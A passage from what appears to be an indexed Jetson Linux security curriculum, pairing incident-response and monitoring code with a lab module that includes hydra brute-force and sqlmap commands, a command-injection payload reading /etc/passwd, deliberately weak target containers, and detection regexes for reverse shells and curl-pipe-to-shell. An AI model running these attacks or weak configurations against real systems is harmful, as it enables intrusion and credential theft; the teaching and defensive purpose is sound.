appropriate response\"\"\"\n        incident_id = f\"INC-{datetime.now().strftime('%Y%m%d-%H%M%S')}\"\n\n        incident = {\n            'id': incident_id,\n            'timestamp': datetime.now().isoformat(),\n            'alert': alert,\n            'severity': alert.get('severity', 'low'),\n            'status': 'open',\n            'actions_taken': [],\n            'resolution': None\n        }\n\n        self.logger.info(f\"Processing incident {incident_id}: {alert.get('description', 'Unknown alert')}\")\n\n        # Determine response actions based on severity\n        severity = incident['severity']\n        actions = self.config['response_actions'].get(severity, ['log_incident'])\n\n        for action in actions:\n            try:\n                if action == 'isolate_device':\n                    self._isolate_device(alert)\n                elif action == 'notify_admin':\n                    self._notify_admin(incident)\n                elif action == 'backup_logs':\n                    self._backup_logs()\n                elif action == 'log_incident':\n                    self._log_incident(incident)\n\n                incident['actions_taken'].append({\n                    'action': action,\n                    'timestamp': datetime.now().isoformat(),\n                    'status': 'completed'\n                })\n\n            except Exception as e:\n                self.logger.error(f\"Failed to execute action {action}: {e}\")\n                incident['actions_taken'].append({\n                    'action': action,\n                    'timestamp': datetime.now().isoformat(),\n                    'status': 'failed',\n                    'error': str(e)\n                })\n\n        # Save incident record\n        self._save_incident(incident)\n\n        return incident\n\n    def _isolate_device(self, alert):\n        \"\"\"Isolate a compromised device from the network\"\"\"\n        if 'remote_ip' in alert:\n            ip = alert['remote_ip']\n            # Block IP using iptables\n            subprocess.run(['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], check=True)\n            self.logger.info(f\"Isolated device with IP {ip}\")\n\n        if 'process' in alert and 'pid' in alert['process']:\n            pid = alert['process']['pid']\n            # Terminate suspicious process\n            subprocess.run(['kill', '-9', str(pid)], check=True)\n            self.logger.info(f\"Terminated suspicious process {pid}\")\n\n    def _notify_admin(self, incident):\n        \"\"\"Send email notification to administrators\"\"\"\n        try:\n            msg = MIMEMultipart()\n            msg['From'] = self.config['email']['username']\n            msg['To'] = ', '.join(self.config['email']['recipients'])\n            msg['Subject'] = f\"Security Incident Alert: {incident['id']}\"\n\n            body = f\"\"\"\n            Security Incident Detected\n\n            Incident ID: {incident['id']}\n            Timestamp: {incident['timestamp']}\n            Severity: {incident['severity'].upper()}\n\n            Alert Details:\n            Type: {incident['alert'].get('type', 'Unknown')}\n            Description: {incident['alert'].get('description', 'No description')}\n\n            Actions Taken:\n            {chr(10).join([f\"- {action['action']}: {action['status']}\" for action in incident['actions_taken']])}\n\n            Please review the incident and take appropriate action if needed.\n\n            Jetson Security System\n            \"\"\"\n\n            msg.attach(MIMEText(body, 'plain'))\n\n            server = smtplib.SMTP(self.config['email']['smtp_server'], self.config['email']['smtp_port'])\n            server.starttls()\n            server.login(self.config['email']['username'], self.config['email']['password'])\n            server.send_message(msg)\n            server.quit()\n\n            self.logger.info(f\"Email notification sent for incident {incident['id']}\")\n\n        except Exception as e:\n            self.logger.error(f\"Failed to send email notification: {e}\")\n\n    def _backup_logs(self):\n        \"\"\"Backup system logs for forensic analysis\"\"\"\n        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\n        backup_dir = f\"/home/secops/data/log_backup_{timestamp}\"\n\n        # Create backup directory\n        subprocess.run(['mkdir', '-p', backup_dir], check=True)\n\n        # Copy important log files\n        log_files = [\n            '/host/var/log/auth.log',\n            '/host/var/log/syslog',\n            '/home/secops/data/security_alerts.json',\n            '/home/secops/data/firewall.log'\n        ]\n\n        for log_file in log_files:\n            try:\n                subprocess.run(['cp', log_file, backup_dir], check=True)\n            except subprocess.CalledProcessError:\n                self.logger.warning(f\"Could not backup {log_file}\")\n\n        self.logger.info(f\"Logs backed up to {backup_dir}\")\n\n    def _log_incident(self, incident):\n        \"\"\"Log incident to incident database\"\"\"\n        incident_file = '/home/secops/data/incidents.json'\n\n        try:\n            with open(incident_file, 'r') as f:\n                incidents = json.load(f)\n        except FileNotFoundError:\n            incidents = []\n\n        incidents.append(incident)\n\n        with open(incident_file, 'w') as f:\n            json.dump(incidents, f, indent=2)\n\n        self.logger.info(f\"Incident {incident['id']} logged to database\")\n\n    def _save_incident(self, incident):\n        \"\"\"Save incident record\"\"\"\n        incident_file = f\"/home/secops/data/incident_{incident['id']}.json\"\n\n        with open(incident_file, 'w') as f:\n            json.dump(incident, f, indent=2)\n\n        self.logger.info(f\"Incident record saved: {incident_file}\")\n\nif __name__ == \"__main__\":\n    # Example usage\n    irs = IncidentResponseSystem()\n\n    # Simulate a high-severity security alert\n    test_alert = {\n        'type': 'brute_force_attempt',\n        'severity': 'high',\n        'remote_ip': '192.168.1.100',\n        'failed_attempts': 10,\n        'timestamp': datetime.now().isoformat(),\n        'description': 'Multiple failed SSH login attempts detected from 192.168.1.100'\n    }\n\n    incident = irs.process_security_alert(test_alert)\n    print(f\"Processed incident: {incident['id']}\")\n</code></pre> <p>Tasks: 1. Configure automated incident response workflows 2. Set up email notifications for security alerts 3. Implement automatic threat isolation 4. Create incident tracking and reporting system</p> <p>Deliverables: - Automated incident response system - Email notification configuration - Threat isolation procedures - Incident tracking database</p>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#advanced-security-hardening-checklist","title":"\ud83d\udd12 Advanced Security Hardening Checklist","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#jetson-specific-security-measures","title":"Jetson-Specific Security Measures","text":"<ul> <li> Container Security</li> <li> Run security tools in isolated containers</li> <li> Use minimal base images</li> <li> Implement container resource limits</li> <li> <p> Regular container image updates</p> </li> <li> <p> Network Security</p> </li> <li> Configure firewall for IoT communication</li> <li> Implement network segmentation</li> <li> Monitor network traffic patterns</li> <li> <p> Use VPN for remote access</p> </li> <li> <p> System Hardening</p> </li> <li> Disable unnecessary services</li> <li> Configure strong authentication</li> <li> Implement file integrity monitoring</li> <li> <p> Regular security updates</p> </li> <li> <p> Monitoring &amp; Logging</p> </li> <li> Real-time threat detection</li> <li> Centralized log collection</li> <li> Automated alert generation</li> <li> <p> Incident response procedures</p> </li> <li> <p> IoT Device Security</p> </li> <li> Change default credentials</li> <li> Enable encryption</li> <li> Regular firmware updates</li> <li> Device access control</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#security-incident-response-playbook","title":"\ud83d\udea8 Security Incident Response Playbook","text":""},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#1-detection-phase","title":"1. Detection Phase","text":"<ul> <li>Monitor security alerts from automated systems</li> <li>Analyze system logs for anomalies</li> <li>Investigate user reports of suspicious activity</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#2-analysis-phase","title":"2. Analysis Phase","text":"<ul> <li>Determine incident severity and scope</li> <li>Identify affected systems and data</li> <li>Collect evidence for forensic analysis</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#3-containment-phase","title":"3. Containment Phase","text":"<ul> <li>Isolate affected systems</li> <li>Prevent lateral movement</li> <li>Preserve evidence</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#4-eradication-phase","title":"4. Eradication Phase","text":"<ul> <li>Remove malware and threats</li> <li>Patch vulnerabilities</li> <li>Update security controls</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#5-recovery-phase","title":"5. Recovery Phase","text":"<ul> <li>Restore systems from clean backups</li> <li>Monitor for recurring issues</li> <li>Validate system integrity</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#6-lessons-learned","title":"6. Lessons Learned","text":"<ul> <li>Document incident details</li> <li>Update security procedures</li> <li>Improve detection capabilities</li> </ul>"},{"location":"curriculum/my_03c_linux_cyber_defense_basics/#final-challenge-comprehensive-security-assessment","title":"\ud83c\udf93 Final Challenge: Comprehensive Security Assessment","text":"<p>Scenario: You are tasked with securing a Jetson-based IoT deployment in a smart building environment.</p> <p>Requirements: 1. Deploy containerized security monitoring system 2. Perform comprehensive IoT device security assessment 3. Implement automated threat detection and response 4. Create security dashboard and reporting system 5. Develop incident response procedures 6. Document security architecture and procedures</p> <p>Evaluation Criteria: - Security tool deployment and configuration - Threat detection accuracy and response time - IoT device vulnerability assessment completeness - Incident response automation effectiveness - Documentation quality and completeness</p> <p>Bonus Points: - Integration with external security tools (SIEM) - Machine learning-based anomaly detection - Custom security rule development - Performance optimization for Jetson hardware</p> <p>Next: Move into simulated attacks and red-team tools to learn how to defend against real-world scenarios in <code>01e_linux_cyber_attack_simulation.md</code>.</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/","title":"My 03d linux cyber attack simulation","text":"<p>\ud83d\udca3 Advanced Cyber Attack Simulation &amp; Defense on Jetson</p> <p>\ud83c\udfaf Purpose</p> <p>This comprehensive module introduces advanced offensive cybersecurity concepts in a safe, controlled Jetson container environment. Students simulate sophisticated attacks targeting IoT and edge devices, practice advanced detection techniques, and develop automated defense systems using containerized security tools.</p> <p>\u26a0\ufe0f CRITICAL: These exercises should only be done in isolated lab environments with proper authorization. Never use these techniques against systems you don't own.</p> <p>\ud83c\udfd7\ufe0f Learning Objectives - Master containerized penetration testing on Jetson devices - Understand IoT-specific attack vectors and vulnerabilities - Implement automated threat detection and response systems - Practice advanced network analysis and forensics - Develop secure coding practices for edge computing</p> <p>\u2e3b</p> <p>\ud83d\udd27 Advanced Security Tools Arsenal</p> Attack Tools Purpose Defense Tools Purpose <code>nmap</code> Port scanning &amp; service enumeration <code>fail2ban</code> Automated IP blocking <code>hydra</code> Brute-force authentication <code>ufw</code>/<code>iptables</code> Firewall management <code>netcat</code> Network connections &amp; backdoors <code>tcpdump</code>/<code>tshark</code> Packet analysis <code>nikto</code> Web vulnerability scanning <code>chkrootkit</code> Rootkit detection <code>sqlmap</code> SQL injection testing <code>rkhunter</code> System integrity checking <code>metasploit</code> Exploitation framework <code>ossec</code> Host-based intrusion detection <code>aircrack-ng</code> Wireless security testing <code>suricata</code> Network intrusion detection <code>john</code> Password cracking <code>lynis</code> Security auditing <code>gobuster</code> Directory/file enumeration <code>aide</code> File integrity monitoring <code>burpsuite</code> Web application testing <code>psad</code> Port scan attack detection <p>\u2e3b</p> <p>\ud83d\udc33 Advanced Jetson Security Lab Environment</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#multi-container-security-architecture","title":"Multi-Container Security Architecture","text":"<p>1. Create Security Lab Network <pre><code># Create isolated network for security testing\ndocker network create --driver bridge --subnet=172.20.0.0/16 seclab-net\n</code></pre></p> <p>2. Attacker Container (Kali-based) <pre><code># Dockerfile.attacker\nFROM kalilinux/kali-rolling:latest\n\nRUN apt update &amp;&amp; apt install -y \\\n    nmap hydra netcat-traditional sqlmap nikto \\\n    gobuster john aircrack-ng metasploit-framework \\\n    burpsuite-pro python3-pip curl wget \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# Install additional Python tools\nRUN pip3 install scapy requests beautifulsoup4 paramiko\n\n# Create non-root user for security\nRUN useradd -m -s /bin/bash attacker &amp;&amp; \\\n    echo 'attacker:kali123' | chpasswd\n\nUSER attacker\nWORKDIR /home/attacker\nCMD [\"/bin/bash\"]\n</code></pre></p> <p>3. Target Container (Vulnerable Services) <pre><code># Dockerfile.target\nFROM ubuntu:22.04\n\nRUN apt update &amp;&amp; apt install -y \\\n    openssh-server apache2 mysql-server \\\n    vsftpd telnetd python3 python3-pip \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# Configure vulnerable services\nRUN echo 'root:vulnerable123' | chpasswd &amp;&amp; \\\n    echo 'admin:admin' | chpasswd &amp;&amp; \\\n    echo 'guest:guest' | chpasswd\n\n# Setup SSH with weak configuration\nRUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config &amp;&amp; \\\n    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config\n\n# Create vulnerable web application\nCOPY vulnerable_app.py /var/www/html/\nRUN chmod +x /var/www/html/vulnerable_app.py\n\nEXPOSE 22 80 21 23 3306\nCMD service ssh start &amp;&amp; service apache2 start &amp;&amp; service mysql start &amp;&amp; tail -f /dev/null\n</code></pre></p> <p>4. Defender Container (Security Monitoring) <pre><code># Dockerfile.defender\nFROM ubuntu:22.04\n\nRUN apt update &amp;&amp; apt install -y \\\n    fail2ban ufw tcpdump tshark \\\n    chkrootkit rkhunter aide lynis \\\n    psad suricata python3-pip \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\nRUN pip3 install psutil scapy matplotlib pandas\n\n# Configure monitoring tools\nCOPY security_monitor.py /opt/\nCOPY suricata.yaml /etc/suricata/\nRUN chmod +x /opt/security_monitor.py\n\nUSER root\nCMD [\"/bin/bash\"]\n</code></pre></p> <p>5. Build and Deploy Lab Environment <pre><code># Build containers\ndocker build -f Dockerfile.attacker -t jetson-attacker .\ndocker build -f Dockerfile.target -t jetson-target .\ndocker build -f Dockerfile.defender -t jetson-defender .\n\n# Deploy lab environment\ndocker run -d --name target --network seclab-net \\\n  --ip 172.20.0.10 jetson-target\n\ndocker run -d --name defender --network seclab-net \\\n  --ip 172.20.0.20 --cap-add=NET_ADMIN jetson-defender\n\ndocker run -it --name attacker --network seclab-net \\\n  --ip 172.20.0.30 jetson-attacker\n</code></pre></p> <p>\u2e3b</p> <p>\u2694\ufe0f Advanced Attack Simulation Scenarios</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#phase-1-reconnaissance-enumeration","title":"Phase 1: Reconnaissance &amp; Enumeration","text":"<p>\ud83d\udd0d 1. Advanced Network Discovery <pre><code># From attacker container\n# Comprehensive network scan\nnmap -sS -sV -sC -O -A 172.20.0.0/16 -oA network_scan\n\n# Service enumeration with scripts\nnmap --script vuln,exploit 172.20.0.10\n\n# UDP scan for hidden services\nnmap -sU --top-ports 1000 172.20.0.10\n</code></pre></p> <p>\ud83d\udd77\ufe0f 2. Web Application Reconnaissance <pre><code># Directory enumeration\ngobuster dir -u http://172.20.0.10 -w /usr/share/wordlists/dirb/common.txt\n\n# Web vulnerability scanning\nnikto -h http://172.20.0.10 -output nikto_scan.txt\n\n# Technology fingerprinting\nwhatweb http://172.20.0.10\n</code></pre></p> <p>\ud83d\udce1 3. IoT Device Fingerprinting <pre><code># iot_scanner.py\nimport nmap\nimport requests\nimport json\nfrom scapy.all import *\n\nclass IoTDeviceScanner:\n    def __init__(self, target_range):\n        self.target_range = target_range\n        self.nm = nmap.PortScanner()\n        self.devices = []\n\n    def scan_network(self):\n        \"\"\"Scan for IoT devices using various techniques\"\"\"\n        # ARP scan for live hosts\n        arp_scan = self.nm.scan(hosts=self.target_range, arguments='-sn')\n\n        for host in self.nm.all_hosts():\n            device_info = self.fingerprint_device(host)\n            if device_info:\n                self.devices.append(device_info)\n\n    def fingerprint_device(self, host):\n        \"\"\"Fingerprint IoT device characteristics\"\"\"\n        device = {'ip': host, 'services': [], 'vulnerabilities': []}\n\n        # Port scan\n        self.nm.scan(host, '1-65535', '-sV -sC')\n\n        if host in self.nm.all_hosts():\n            for proto in self.nm[host].all_protocols():\n                ports = self.nm[host][proto].keys()\n                for port in ports:\n                    service = self.nm[host][proto][port]\n                    device['services'].append({\n                        'port': port,\n                        'service': service['name'],\n                        'version': service.get('version', 'unknown')\n                    })\n\n        # Check for common IoT vulnerabilities\n        self.check_iot_vulns(device)\n        return device\n\n    def check_iot_vulns(self, device):\n        \"\"\"Check for common IoT vulnerabilities\"\"\"\n        # Default credentials check\n        default_creds = [\n            ('admin', 'admin'), ('admin', 'password'),\n            ('root', 'root'), ('admin', '12345')\n        ]\n\n        for service in device['services']:\n            if service['service'] in ['ssh', 'telnet', 'http']:\n                for user, pwd in default_creds:\n                    if self.test_credentials(device['ip'], service['port'], user, pwd):\n                        device['vulnerabilities'].append({\n                            'type': 'default_credentials',\n                            'service': service['service'],\n                            'credentials': f\"{user}:{pwd}\"\n                        })\n\n    def test_credentials(self, host, port, username, password):\n        \"\"\"Test credentials against service\"\"\"\n        try:\n            if port == 22:  # SSH\n                import paramiko\n                ssh = paramiko.SSHClient()\n                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n                ssh.connect(host, port, username, password, timeout=5)\n                ssh.close()\n                return True\n        except:\n            pass\n        return False\n\n# Usage\nscanner = IoTDeviceScanner('172.20.0.0/16')\nscanner.scan_network()\nprint(json.dumps(scanner.devices, indent=2))\n</code></pre></p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#phase-2-exploitation","title":"Phase 2: Exploitation","text":"<p>\ud83d\udca5 4. Multi-Vector Brute Force Attack <pre><code># SSH brute force with custom wordlist\nhydra -L users.txt -P passwords.txt ssh://172.20.0.10 -t 4 -V\n\n# HTTP form brute force\nhydra -L users.txt -P passwords.txt 172.20.0.10 http-post-form \\\n  \"/login.php:username=^USER^&amp;password=^PASS^:Invalid\"\n\n# FTP brute force\nhydra -L users.txt -P passwords.txt ftp://172.20.0.10\n</code></pre></p> <p>\ud83d\udd73\ufe0f 5. Web Application Exploitation <pre><code># SQL injection testing\nsqlmap -u \"http://172.20.0.10/login.php\" --data=\"username=admin&amp;password=test\" \\\n  --dbs --batch --level=5 --risk=3\n\n# Command injection testing\ncurl -X POST \"http://172.20.0.10/ping.php\" \\\n  -d \"host=127.0.0.1; cat /etc/passwd\"\n</code></pre></p> <p>\ud83c\udfad 6. Advanced Persistent Threat (APT) Simulation <pre><code># apt_simulator.py\nimport time\nimport random\nimport subprocess\nimport threading\nfrom datetime import datetime\n\nclass APTSimulator:\n    def __init__(self, target_ip):\n        self.target_ip = target_ip\n        self.persistence_methods = []\n        self.data_exfil_active = False\n\n    def initial_compromise(self):\n        \"\"\"Simulate initial system compromise\"\"\"\n        print(f\"[{datetime.now()}] Attempting initial compromise...\")\n\n        # Simulate exploit\n        result = subprocess.run([\n            'nmap', '--script', 'vuln', self.target_ip\n        ], capture_output=True, text=True)\n\n        if \"VULNERABLE\" in result.stdout:\n            print(\"[+] Vulnerability found, exploiting...\")\n            return self.establish_foothold()\n        return False\n\n    def establish_foothold(self):\n        \"\"\"Establish persistent access\"\"\"\n        # Simulate reverse shell\n        print(\"[+] Establishing reverse shell...\")\n\n        # Create persistence\n        self.create_persistence()\n\n        # Start data exfiltration\n        self.start_data_exfiltration()\n\n        return True\n\n    def create_persistence(self):\n        \"\"\"Create multiple persistence mechanisms\"\"\"\n        persistence_methods = [\n            self.cron_persistence,\n            self.service_persistence,\n            self.ssh_key_persistence\n        ]\n\n        for method in persistence_methods:\n            try:\n                method()\n                print(f\"[+] Persistence method activated: {method.__name__}\")\n            except Exception as e:\n                print(f\"[-] Failed to activate {method.__name__}: {e}\")\n\n    def cron_persistence(self):\n        \"\"\"Simulate cron-based persistence\"\"\"\n        cron_job = \"*/5 * * * * /tmp/.hidden_script.sh\"\n        print(f\"[+] Adding cron job: {cron_job}\")\n\n    def service_persistence(self):\n        \"\"\"Simulate service-based persistence\"\"\"\n        service_name = \"system-update-daemon\"\n        print(f\"[+] Creating malicious service: {service_name}\")\n\n    def ssh_key_persistence(self):\n        \"\"\"Simulate SSH key-based persistence\"\"\"\n        print(\"[+] Adding SSH public key to authorized_keys\")\n\n    def start_data_exfiltration(self):\n        \"\"\"Start background data exfiltration\"\"\"\n        self.data_exfil_active = True\n        exfil_thread = threading.Thread(target=self.exfiltrate_data)\n        exfil_thread.daemon = True\n        exfil_thread.start()\n\n    def exfiltrate_data(self):\n        \"\"\"Simulate data exfiltration\"\"\"\n        while self.data_exfil_active:\n            # Simulate data collection\n            print(f\"[{datetime.now()}] Collecting sensitive data...\")\n\n            # Simulate network exfiltration\n            time.sleep(random.randint(30, 120))\n            print(f\"[{datetime.now()}] Exfiltrating data to C2 server...\")\n\n            time.sleep(300)  # Wait 5 minutes\n\n    def lateral_movement(self):\n        \"\"\"Simulate lateral movement\"\"\"\n        print(\"[+] Attempting lateral movement...\")\n\n        # Network discovery\n        subprocess.run(['nmap', '-sn', '172.20.0.0/16'])\n\n        # Credential harvesting\n        print(\"[+] Harvesting credentials...\")\n\n        # Privilege escalation\n        print(\"[+] Attempting privilege escalation...\")\n\n# Usage\napt = APTSimulator('172.20.0.10')\nif apt.initial_compromise():\n    apt.lateral_movement()\n</code></pre></p> <p>\u2e3b</p> <p>\ud83d\udee1\ufe0f Advanced Defense &amp; Detection Systems</p>"},{"location":"curriculum/my_03d_linux_cyber_attack_simulation/#automated-threat-detection-system","title":"Automated Threat Detection System","text":"<p>\ud83e\udd16 1. Intelligent Security Monitor <pre><code># security_monitor.py\nimport psutil\nimport subprocess\nimport json\nimport time\nimport threading\nfrom datetime import datetime\nimport re\nfrom collections import defaultdict\n\nclass JetsonSecurityMonitor:\n    def __init__(self):\n        self.alerts = []\n        self.network_baseline = {}\n        self.process_baseline = set()\n        self.monitoring = False\n        self.threat_indicators = {\n            'port_scan': re.compile(r'SYN.*flags.*'),\n            'brute_force': re.compile(r'Failed password.*'),\n            'reverse_shell': re.compile(r'nc.*-e.*|bash.*-i.*'),\n            'privilege_escalation': re.compile(r'sudo.*COMMAND.*')\n        }\n\n    def start_monitoring(self):\n        \"\"\"Start comprehensive security monitoring\"\"\"\n        self.monitoring = True\n\n        # Start monitoring threads\n        threads = [\n            threading.Thread(target=self.monitor_network_traffic),\n            threading.Thread(target=self.monitor_system_processes),\n            threading.Thread(target=self.monitor_file_integrity),\n            threading.Thread(target=self.monitor_authentication_logs),\n            threading.Thread(target=self.analyze_behavioral_patterns)\n        ]\n\n        for thread in threads:\n            thread.daemon = True\n            thread.start()\n\n        print(\"[+] Security monitoring started\")\n\n    def monitor_network_traffic(self):\n        \"\"\"Monitor network traffic for suspicious patterns\"\"\"\n        while self.monitoring:\n            try:\n                # Capture network packets\n                result = subprocess.run([\n                    'tcpdump', '-i', 'any', '-c', '100', '-n'\n                ], capture_output=True, text=True, timeout=30)\n\n                self.analyze_network_patterns(result.stdout)\n                time.sleep(10)\n            except Exception as e:\n                print(f\"Network monitoring error: {e}\")\n\n    def analyze_network_patterns(self, traffic_data):\n        \"\"\"Analyze network traffic for attack patterns\"\"\"\n        lines = traffic_data.split('\\n')\n\n        # Detect port scanning\n        syn_packets = defaultdict(int)\n        for line in lines:\n            if 'Flags [S]' in line:  # SYN packets\n                src_ip = self.extract_src_ip(line)\n                syn_packets[src_ip] += 1\n\n        # Alert on potential port scan\n        for ip, count in syn_packets.items():\n            if count &gt; 20:  # Threshold for port scan\n                self.create_alert('port_scan', f\"Potential port scan from {ip}: {count} SYN packets\")\n\n    def monitor_system_processes(self):\n        \"\"\"Monitor system processes for suspicious activity\"\"\"\n        while self.monitoring:\n            try:\n                current_processes = set()\n                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):\n                    try:\n                        cmdline = ' '.join(proc.info['cmdline'] or [])\n                        current_processes.add((proc.info['name'], cmdline))\n\n                        # Check for suspicious commands\n                        self.check_suspicious_process(proc.info)\n                    except (psutil.NoSuchProcess, psutil.AccessDenied):\n                        continue\n\n                # Detect new processes\n                new_processes = current_processes - self.process_baseline\n                if new_processes and self.process_baseline:\n                    for name, cmdline in new_processes:\n                        self.create_alert('new_process', f\"New process detected: {name} - {cmdline}\")\n\n                self.process_baseline = current_processes\n                time.sleep(5)\n            except Exception as e:\n                print(f\"Process monitoring error: {e}\")\n\n    def check_suspicious_process(self, proc_info):\n        \"\"\"Check if process exhibits suspicious behavior\"\"\"\n        cmdline = ' '.join(proc_info['cmdline'] or [])\n\n        suspicious_patterns = [\n            r'nc.*-e.*',  # Netcat reverse shell\n            r'bash.*-i.*',  # Interactive bash\n            r'/tmp/.*',  # Execution from /tmp\n            r'wget.*\\|.*sh',  # Download and execute\n            r'curl.*\\|.*sh',  # Download and execute\n            r'python.*-c.*socket',  # Python reverse shell\n        ]\n\n        for pattern in suspicious_patterns:\n            if re.search(pattern, cmdline, re.IGNORECASE):\n                self.create_alert('suspicious_process', \n                    f\"Suspicious process: {proc_info['name']} - {cmdline}\")\n\n    def monitor_authentication_logs(self):\n        \"\"\"Monitor authentication logs for brute force attempts\"\"\"\n        failed_attempts = defaultdict(int)\n\n        while self.monitoring:\n            try:\n                # Read auth logs\n                result = subprocess.run([\n                    'tail', '-n', '50', '/var/log/auth.log'\n                ], capture_output=True, text=True)\n\n                for line in result.stdout.split('\\n'):\n                    if 'Failed password' in line:\n                        ip = self.extract_ip_from_log(line)\n                        if ip:\n                            failed_attempts[ip] += 1\n\n                            if failed_attempts[ip] &gt; 5:\n                                self.create_alert('brute_force', \n                                    f\"Brute force attack detected from {ip}: {failed_attempts[ip]} attempts\")\n                                self.block_ip(ip)\n\n                time.sleep(30)\n            except Exception as e:\n                print(f\"Auth log monitoring error: {e}\")\n\n    def monitor_file_integrity(self):\n        \"\"\"Monitor critical files for unauthorized changes\"\"\"\n        critical_files = [\n            '/etc/passwd', '/etc/shadow', '/etc/sudoers',\n            '/etc/ssh/sshd_config', '/etc/crontab'\n        ]\n\n        file_hashes = {}\n\n        # Initial hash calculation\n        for file_path in critical_files:\n            try:\n                result = subprocess.run(['sha256sum', file_path], \n                    capture_output=True, text=True)\n                file_hashes[file_path] = result.stdout.split()[0]\n            except:\n                continue\n\n        while self.monitoring:\n            try:\n                for file_path in critical_files:\n                    result = subprocess.run(['sha256sum', file_path], \n                        capture_output=True, text=True)\n                    current_hash = result.stdout.split()[0]\n\n                    if file_path in file_hashes and file_hashes[file_path] != current_hash:\n                        self.create_alert('file_integrity', \n                            f\"Critical file modified: {file_path}\")\n                        file_hashes[file_path] = current_hash\n\n                time.sleep(60)\n            except Exception as e:\n                print(f\"File integrity monitoring error: {e}\")\n\n    def analyze_behavioral_patterns(self):\n        \"\"\"Analyze system behavior for anomalies\"\"\"\n        while self.monitoring:\n            try:\n                # CPU usage analysis\n                cpu_percent = psutil.cpu_percent(interval=1)\n                if cpu_percent &gt; 90:\n                    self.create_alert('resource_anomaly', \n                        f\"High CPU usage detected: {cpu_percent}%\")\n\n                # Memory usage analysis\n                memory = psutil.virtual_memory()\n                if memory.percent &gt; 90:\n                    self.create_alert('resource_anomaly', \n                        f\"High memory usage detected: {memory.percent}%\")\n\n                # Network connections analysis\n                connections = psutil.net_connections()\n                external_connections = [conn for conn in connections \n                    if conn.raddr and not conn.raddr.ip.startswith('127.')]\n\n                if len(external_connections) &gt; 50:\n                    self.create_alert('network_anomaly', \n                        f\"High number of external connections: {len(external_connections)}\")\n\n                time.sleep(30)\n            except Exception as e:\n                print(f\"Behavioral analysis error: {e}\")\n\n    def create_alert(self, alert_type, message):\n        \"\"\"Create and log security alert\"\"\"\n        alert = {\n            'timestamp': datetime.now().isoformat(),\n            'type': alert_type,\n            'message': message,\n            'severity': self.get_severity(alert_type)\n        }\n\n        self.alerts.append(alert)\n        print(f\"[ALERT] {alert['timestamp']} - {alert_type.upper()}: {message}\")\n\n        # Auto-response for critical alerts\n        if alert['severity'] == 'critical':\n            self.auto_respond(alert)\n\n    def get_severity(self, alert_type):\n        \"\"\"Determine alert severity\"\"\"\n        severity_map = {\n            'port_scan': 'medium',\n            'brute_force': 'high',\n            'suspicious_process': 'high',\n            'file_integrity': 'critical',\n            'resource_anomaly': 'medium',\n            'network_anomaly': 'medium'\n        }\n        return severity_map.get(alert_type, 'low')\n\n    def auto_respond(self, alert):\n        \"\"\"Automated response to critical alerts\"\"\"\n        if alert['type'] == 'brute_force':\n            ip = self.extract_ip_from_message(alert['message'])\n            if ip:\n                self.block_ip(ip)\n        elif alert['type'] == 'suspicious_process':\n            # Could implement process termination here\n            pass\n\n    def block_ip(self, ip):\n        \"\"\"Block IP address using iptables\"\"\"\n        try:\n            subprocess.run(['iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'])\n            print(f\"[+] Blocked IP: {ip}\")\n        except Exception as e:\n            print(f\"Failed to block IP {ip}: {e}\")\n\n    def extract_src_ip(self, line):\n        \"\"\"Extract source IP from network traffic line\"\"\"\n        match = re.search(r'(\\d+\\.\\d+\\.\\d+\\.\\d+)', line)\n        return match.group(1) if match else None\n\n    def extract_ip_from_log(self, line):\n        \"\"\"Extract IP from log line\"\"\"\n        match = re.search(r'from (\\d+\\.\\d+\\.\\d+\\.\\d+)', line)\n        return match.group(1) if match else None\n\n    def extract_ip_from_message(self, message):\n        \"\"\"Extract IP from alert message\"\"\"\n        match = re.search(r'(\\d+\\.\\d+\\.\\d+\\.\\d+)', message)\n        return match.group(1) if match else None\n\n    def get_security_report(self):\n        \"\"\"Generate security report\"\"\"\n        report = {\n            'total_alerts': len(self.alerts),\n            'alerts_by_type': defaultdict(int),\n            'alerts_by_severity': defaultdict(int),\n            'recent_alerts': self.alerts[-10:]\n        }\n\n        for alert in self.alerts:\n            report['alerts_by_type'][alert['type']] += 1\n            report['alerts_by_severity'][alert['severity']] += 1\n\n        return report\n\n# Usage\nmonitor = JetsonSecurityMonitor()\nmonitor.start_monitoring()\n\n# Keep monitoring running\ntry:\n    while True:\n        time.sleep(60)\n        report = monitor.get_security_report()\n        print(f\"\\n[REPORT] Total alerts: {report['total_alerts']}\")\nexcept KeyboardInterrupt:\n    monitor.monitoring = False\n    print(\"\\n[+] Security monitoring stopped\")\n</code></pre></p> <p>\ud83d\udd12 2. Advanced Firewall Management <pre><code># advanced_firewall.py\nimport subprocess\nimport json\nfrom datetime import datetime, timedelta\n\nclass JetsonFirewall:\n    def __init__(self):\n        self.blocked_ips = set()\n        self.rules = []\n        self.whitelist = {'127.0.0.1', '172.20.0.20'}  # Defender IP\n\n    def setup_base_rules(self):\n        \"\"\"Setup base firewall rules\"\"\"\n        base_rules = [\n            # Allow loopback\n            'iptables -A INPUT -i lo -j ACCEPT',\n            # Allow established connections\n            'iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT',\n            # Allow SSH from specific subnet only\n            'iptables -A INPUT -p tcp --dport 22 -s 